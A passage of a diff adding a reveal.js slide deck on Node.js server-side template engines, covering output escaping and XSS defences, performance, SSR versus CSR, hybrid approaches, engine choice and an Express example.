+// => Script EXECUTES in victim's browser</code></pre>
+            </div>
+            <div class="card green" style="margin-top:.35em;">
+              <h3>Auto-Escaping by Engine</h3>
+              <table>
+                <tr><th>Engine</th><th>Escaped Output</th><th>Raw / Unescaped</th></tr>
+                <tr><td>EJS</td><td><code>&lt;%= %&gt;</code></td><td><code>&lt;%- %&gt;</code></td></tr>
+                <tr><td>Pug</td><td><code>= expr</code></td><td><code>!= expr</code></td></tr>
+                <tr><td>Handlebars</td><td><code>{{expr}}</code></td><td><code>{{{expr}}}</code></td></tr>
+                <tr><td>Nunjucks</td><td><code>{{expr}}</code> (if enabled)</td><td><code>{{expr | safe}}</code></td></tr>
+              </table>
+            </div>
+          </div>
+          <div>
+            <div class="card amber">
+              <h3>Defence in Depth</h3>
+              <ul>
+                <li><span class="a">Always use escaped output</span> as default</li>
+                <li>Only use raw output for trusted, pre-sanitised HTML</li>
+                <li>Sanitise with <code>DOMPurify</code> or <code>sanitize-html</code> before storage</li>
+                <li>Set <code>Content-Security-Policy</code> headers</li>
+                <li>Use <code>helmet</code> middleware in Express</li>
+              </ul>
+              <pre><code class="language-javascript">const sanitizeHtml = require('sanitize-html');
+
+// Sanitise BEFORE storing
+const clean = sanitizeHtml(userInput, {
+  allowedTags: ['b', 'i', 'em', 'strong', 'a'],
+  allowedAttributes: { a: ['href'] }
+});
+
+// Now safe to render raw
+// &lt;%- clean %&gt;</code></pre>
+            </div>
+            <div class="card purple" style="margin-top:.35em;">
+              <h3>CSP Header Example</h3>
+              <pre><code class="language-javascript">const helmet = require('helmet');
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'"],
+    styleSrc: ["'self'", "'unsafe-inline'"]
+  }
+}));</code></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 14 — PERFORMANCE ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">14</span><h2>Performance</h2></div>
+        <div class="cols cols-3">
+          <div class="card amber">
+            <h3>Template Caching</h3>
+            <pre><code class="language-javascript">// Express enables caching
+// automatically in production
+app.set('view cache', true);
+
+// NODE_ENV=production does
+// this by default
+
+// In development, templates
+// are re-read from disk on
+// every render call</code></pre>
+            <p style="margin-top:.2em;">Caching stores the <span class="a">compiled function</span>, not the rendered HTML. Each render still executes the function with fresh data.</p>
+          </div>
+          <div class="card green">
+            <h3>Precompilation</h3>
+            <pre><code class="language-bash"># Handlebars CLI precompile
+npx handlebars views/ \
+  -f public/js/templates.js
+
+# Pug compile at build time
+const pug = require('pug');
+const fn = pug.compileFile(
+  'views/user.pug'
+);
+// fn({ user }) => HTML string</code></pre>
+            <p style="margin-top:.2em;">Precompilation eliminates <span class="g">parse + compile</span> cost entirely. Only the render step runs at request time.</p>
+          </div>
+          <div class="card purple">
+            <h3>Streaming Renders</h3>
+            <pre><code class="language-javascript">// Marko supports streaming
+const template = require(
+  './views/page.marko'
+);
+
+app.get('/', (req, res) =&gt; {
+  res.type('html');
+  template.render({ data }, res);
+  // Chunks sent as rendered
+  // TTFB is near-instant
+});</code></pre>
+            <p style="margin-top:.2em;">Streaming sends HTML chunks as they're rendered, dramatically improving <span class="p">Time to First Byte</span>.</p>
+          </div>
+        </div>
+        <div class="card blue" style="margin-top:.4em;">
+          <h3>Benchmark Considerations</h3>
+          <table>
+            <tr><th>Strategy</th><th>Impact</th><th>Trade-off</th></tr>
+            <tr><td>View caching</td><td>10-50x faster repeated renders</td><td>Must restart to pick up template changes</td></tr>
+            <tr><td>Precompilation</td><td>Eliminates parse/compile overhead</td><td>Requires build step</td></tr>
+            <tr><td>Fragment caching</td><td>Cache expensive partials (Redis/LRU)</td><td>Cache invalidation complexity</td></tr>
+            <tr><td>Streaming</td><td>Near-instant TTFB</td><td>Limited engine support (Marko, React)</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 15 — SSR VS CSR ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">15</span><h2>Server-Side vs Client-Side Rendering</h2></div>
+        <table>
+          <tr>
+            <th>Dimension</th>
+            <th><span class="a">SSR (Template Engines)</span></th>
+            <th><span class="b">CSR (React, Vue SPA)</span></th>
+          </tr>
+          <tr>
+            <td>First Contentful Paint</td>
+            <td>Fast &mdash; HTML arrives ready</td>
+            <td>Slow &mdash; blank until JS bundle loads</td>
+          </tr>
+          <tr>
+            <td>Time to Interactive</td>
+            <td>Immediate (no hydration)</td>
+            <td>Delayed by JS parse + hydration</td>
+          </tr>
+          <tr>
+            <td>SEO</td>
+            <td>Excellent &mdash; crawlers see full content</td>
+            <td>Requires SSR/SSG or prerendering</td>
+          </tr>
+          <tr>
+            <td>Bundle Size</td>
+            <td>Zero client JS (unless added)</td>
+            <td>100KB-2MB+ framework + app code</td>
+          </tr>
+          <tr>
+            <td>Interactivity</td>
+            <td>Full page reloads (form posts)</td>
+            <td>Instant UI updates, optimistic UI</td>
+          </tr>
+          <tr>
+            <td>Server Load</td>
+            <td>Higher &mdash; renders on every request</td>
+            <td>Lower &mdash; serves static files + API</td>
+          </tr>
+          <tr>
+            <td>Complexity</td>
+            <td>Simple &mdash; HTML + data</td>
+            <td>State management, routing, build tooling</td>
+          </tr>
+          <tr>
+            <td>Offline Support</td>
+            <td>None (server required)</td>
+            <td>Service Workers + cached assets</td>
+          </tr>
+        </table>
+        <div class="cols cols-2" style="margin-top:.35em;">
+          <div class="card green">
+            <h3>SSR Wins When</h3>
+            <ul>
+              <li>Content-heavy sites (blogs, docs, e-commerce)</li>
+              <li>SEO is critical</li>
+              <li>Low-powered client devices</li>
+              <li>Minimal client-side interactivity needed</li>
+            </ul>
+          </div>
+          <div class="card purple">
+            <h3>CSR Wins When</h3>
+            <ul>
+              <li>Highly interactive dashboards / apps</li>
+              <li>Real-time collaboration features</li>
+              <li>Offline-first requirements</li>
+              <li>Complex client state management</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 16 — HYBRID APPROACHES ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">16</span><h2>Hybrid Approaches</h2></div>
+        <div class="cols cols-3">
+          <div class="card amber">
+            <h3>HTMX</h3>
+            <p>Server renders HTML fragments; HTMX swaps them into the DOM via <span class="a">hypermedia</span> attributes. No client framework needed.</p>
+            <pre><code class="language-html">&lt;button hx-get="/api/users"
+        hx-target="#user-list"
+        hx-swap="innerHTML"
+        hx-indicator="#spinner"&gt;
+  Load Users
+&lt;/button&gt;
+
+&lt;div id="user-list"&gt;&lt;/div&gt;
+&lt;span id="spinner"
+      class="htmx-indicator"&gt;
+  Loading...
+&lt;/span&gt;</code></pre>
+          </div>
+          <div class="card green">
+            <h3>Islands Architecture</h3>
+            <p>Static SSR HTML with isolated <span class="g">interactive islands</span> that hydrate independently. Pioneered by Astro.</p>
+            <pre><code class="language-html">&lt;!-- Astro component --&gt;
+---
+import Header from './Header.astro';
+import Cart from './Cart.jsx';
+---
+&lt;!-- Static: zero JS --&gt;
+&lt;Header /&gt;
+
+&lt;!-- Interactive island --&gt;
+&lt;Cart client:visible /&gt;
+
+&lt;!-- Static: zero JS --&gt;
+&lt;footer&gt;...&lt;/footer&gt;</code></pre>
+          </div>
+          <div class="card purple">
+            <h3>Partial Hydration</h3>
+            <p>Frameworks like <span class="p">Qwik</span> and <span class="p">React Server Components</span> serialise state so components hydrate only when interacted with.</p>
+            <pre><code class="language-jsx">// React Server Component
+// This never ships to the client
+async function UserList() {
+  const users = await db.query(
+    'SELECT * FROM users'
+  );
+  return (
+    &lt;ul&gt;
+      {users.map(u =&gt;
+        &lt;li key={u.id}&gt;{u.name}&lt;/li&gt;
+      )}
+    &lt;/ul&gt;
+  );
+}</code></pre>
+          </div>
+        </div>
+        <div class="card blue" style="margin-top:.4em;">
+          <h3>The Spectrum</h3>
+          <p>
+            <span class="pill amber">Full SSR</span>
+            <span class="pill green">SSR + HTMX</span>
+            <span class="pill purple">Islands</span>
+            <span class="pill blue">RSC / Partial Hydration</span>
+            <span class="pill amber">Full CSR SPA</span>
+            &mdash; Choose the point on the spectrum that matches your interactivity requirements.
+          </p>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 17 — CHOOSING A TEMPLATE ENGINE ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">17</span><h2>Choosing a Template Engine</h2></div>
+        <table>
+          <tr>
+            <th>Criterion</th>
+            <th><span class="a">EJS</span></th>
+            <th><span class="g">Pug</span></th>
+            <th><span class="p">Handlebars</span></th>
+            <th><span class="b">Nunjucks</span></th>
+          </tr>
+          <tr>
+            <td>Learning Curve</td>
+            <td>Minimal (it's JS)</td>
+            <td>Moderate (new syntax)</td>
+            <td>Low</td>
+            <td>Low-Moderate</td>
+          </tr>
+          <tr>
+            <td>Template Logic</td>
+            <td>Full JavaScript</td>
+            <td>Full JavaScript</td>
+            <td>Helpers only</td>
+            <td>Filters + Macros</td>
+          </tr>
+          <tr>
+            <td>Inheritance</td>
+            <td>Partials only</td>
+            <td>Full (extends/block)</td>
+            <td>Layout plugin</td>
+            <td>Full (extends/block)</td>
+          </tr>
+          <tr>
+            <td>Security Default</td>
+            <td>Escaped by default</td>
+            <td>Escaped by default</td>
+            <td>Escaped by default</td>
+            <td>Configurable</td>
+          </tr>
+          <tr>
+            <td>Precompilation</td>
+            <td>Limited</td>
+            <td>Yes (CLI)</td>
+            <td>Yes (CLI)</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>Client-Side Use</td>
+            <td>Yes (ejs.min.js)</td>
+            <td>Yes (pug runtime)</td>
+            <td>Yes (handlebars.js)</td>
+            <td>Yes (slim build)</td>
+          </tr>
+          <tr>
+            <td>Best For</td>
+            <td>Quick prototypes, JS teams</td>
+            <td>Clean markup, designers</td>
+            <td>Logic-less enforcement</td>
+            <td>Complex layouts, Python devs</td>
+          </tr>
+        </table>
+        <div class="cols cols-2" style="margin-top:.35em;">
+          <div class="card amber">
+            <h3>Decision Heuristic</h3>
+            <ul>
+              <li>Need full JS power in templates? <span class="a">EJS</span> or <span class="g">Pug</span></li>
+              <li>Want strict separation of logic? <span class="p">Handlebars</span></li>
+              <li>Need macros + inheritance? <span class="b">Nunjucks</span></li>
+              <li>Team knows Python/Jinja2? <span class="b">Nunjucks</span></li>
+              <li>Shortest path to working code? <span class="a">EJS</span></li>
+            </ul>
+          </div>
+          <div class="card green">
+            <h3>Don't Overthink It</h3>
+            <p>All major engines are battle-tested in production. The performance differences are negligible for most applications. Choose based on <span class="a">team familiarity</span> and <span class="p">architectural preferences</span> (logic-full vs logic-less, inheritance vs partials).</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 18 — EXPRESS INTEGRATION ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">18</span><h2>Express Integration &mdash; Complete Example</h2></div>
+        <div class="cols cols-2">
+          <div>
+            <div class="card amber">
+              <h3>app.js</h3>
+              <pre><code class="language-javascript">const express = require('express');
+const path = require('path');
+const app = express();
+
+// View engine setup
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'));
+
+// Static files
+app.use(express.static('public'));
+app.use(express.urlencoded({ extended: true }));
+
+// Global locals
+app.locals.siteName = 'MyApp';
+
+// Per-request locals
+app.use((req, res, next) =&gt; {
+  res.locals.currentUser = req.user || null;
+  res.locals.path = req.path;
+  next();
+});
+
+// Routes
+app.get('/', (req, res) =&gt; {
+  res.render('pages/home', {
+    title: 'Home'
+  });
+});
+
+app.get('/users', async (req, res) =&gt; {
+  const users = await User.find();
+  res.render('pages/users', {
+    title: 'Users', users
+  });
+});
+
+app.use((req, res) =&gt; {
+  res.status(404).render('errors/404');
+});
+
+app.listen(3000);</code></pre>
+            </div>
+          </div>
+          <div>
+            <div class="card green">
+              <h3>views/layouts/main.ejs</h3>
+              <pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+  &lt;meta charset="UTF-8"&gt;
+  &lt;title&gt;&lt;%= title %&gt; | &lt;%= siteName %&gt;&lt;/title&gt;
+  &lt;link rel="stylesheet" href="/css/app.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;%- include('../partials/nav') %&gt;
+  &lt;main class="container"&gt;
+    &lt;%- include('../partials/flash') %&gt;
+    &lt;%- body %&gt;
+  &lt;/main&gt;
+  &lt;%- include('../partials/footer') %&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            </div>
+            <div class="card purple" style="margin-top:.35em;">
+              <h3>Project Structure</h3>
+              <pre><code class="language-text">project/
+├── app.js
+├── package.json
+├── public/
+│   ├── css/app.css
+│   └── js/app.js
+└── views/
+    ├── layouts/
+    │   └── main.ejs
+    ├── partials/
+    │   ├── nav.ejs
+    │   ├── footer.ejs
+    │   └── flash.ejs
+    ├── pages/
+    │   ├── home.ejs
+    │   └── users.ejs
+    └── errors/
+        ├── 404.ejs
+        └── 500.ejs</code></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 19 — SUMMARY & NEXT STEPS ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">19</span><h2>Summary &amp; Next Steps</h2></div>
+        <div class="cols cols-2">
+          <div class="card amber">
+            <h3>Key Takeaways</h3>
+            <ul>
+              <li>Server-side templating merges <span class="a">data + markup</span> on the server to produce complete HTML</li>
+              <li>Engines follow a <span class="g">parse &rarr; compile &rarr; render</span> pipeline; caching skips parse/compile</li>
+              <li><span class="p">EJS</span> for pure JS, <span class="b">Pug</span> for clean syntax, <span class="a">Handlebars</span> for logic-less, <span class="g">Nunjucks</span> for macros/inheritance</li>
+              <li><span class="r">Always escape output</span> &mdash; XSS is the primary template security risk</li>
+              <li>Template inheritance and partials eliminate duplication</li>
+              <li>Hybrid approaches (HTMX, Islands) bridge SSR and interactivity</li>
+            </ul>
+          </div>
+          <div>
+            <div class="card green">
+              <h3>Next Steps</h3>
+              <ul>
+                <li>Build a CRUD app with Express + your chosen engine</li>
+                <li>Implement a layout with partials for nav, footer, flash</li>
+                <li>Add HTMX for dynamic updates without a framework</li>
+                <li>Set up helmet + CSP headers for security</li>
+                <li>Benchmark your engine with <code>autocannon</code></li>
+                <li>Explore Astro or Remix for hybrid SSR/CSR</li>
+              </ul>
+            </div>
+            <div class="card blue" style="margin-top:.35em;">
+              <h3>Resources</h3>
+              <ul>
+                <li><a href="https://ejs.co" style="color:var(--blue);">ejs.co</a> &mdash; EJS documentation</li>
+                <li><a href="https://pugjs.org" style="color:var(--blue);">pugjs.org</a> &mdash; Pug documentation</li>
+                <li><a href="https://handlebarsjs.com" style="color:var(--blue);">handlebarsjs.com</a> &mdash; Handlebars guide</li>
+                <li><a href="https://mozilla.github.io/nunjucks/" style="color:var(--blue);">Nunjucks docs</a> &mdash; Mozilla Nunjucks</li>
+                <li><a href="https://htmx.org" style="color:var(--blue);">htmx.org</a> &mdash; HTMX</li>
+                <li><a href="https://expressjs.com/en/guide/using-template-engines.html" style="color:var(--blue);">Express template guide</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </div>
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/highlight.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/monokai.min.css">
+  <script>
+    Reveal.initialize({
+      hash: true,
+      transition: 'fade',
+      transitionSpeed: 'fast',
+      controls: true,
+      progress: true,
+      center: false,
+      width: 1100,
+      height: 900,
+      margin: 0.01,
+      plugins: [RevealHighlight],
+      highlight: { theme: 'monokai' }
+    });
+  </script>
+</body>
+</html>
